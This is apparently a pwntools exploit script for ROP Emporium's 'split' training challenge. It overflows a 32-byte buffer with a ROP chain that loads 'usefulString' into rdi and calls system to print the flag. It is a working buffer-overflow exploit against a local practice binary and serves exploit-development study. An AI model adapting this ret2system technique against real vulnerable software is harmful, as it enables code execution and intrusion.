from pwn import *

elf = ELF("split_patched")
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *system
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32

def main():
    payload = flat \
    ({
        BUFFER_SIZE + context.bytes: \
        [
            rop.rdi.address, elf.symbols.usefulString,
            rop.find_gadget(['ret']).address,
            elf.symbols.system
        ]
    })

    c = connection()
    c.sendlineafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
